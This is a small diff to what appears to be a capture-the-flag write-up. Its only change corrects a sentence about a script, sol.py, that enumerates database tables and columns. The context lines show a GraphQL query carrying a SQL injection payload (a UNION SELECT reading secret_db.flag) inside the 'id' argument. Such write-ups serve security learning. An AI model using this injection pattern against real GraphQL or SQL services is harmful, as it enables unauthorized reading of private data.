@@ -49,4 +49,4 @@ payload get flag:
 "query":"{ rocket(id: \"0 UNION SELECT 2,value,2,2 FROM secret_db.flag limit 1 offset 0-- -\") { name, country, is_active } }"
 ```
 
-i wrote sol.py to enum table (uncomment to use) and column (comment to use).
+i wrote sol.py to enum table (uncomment to use) and column (uncomment to use).
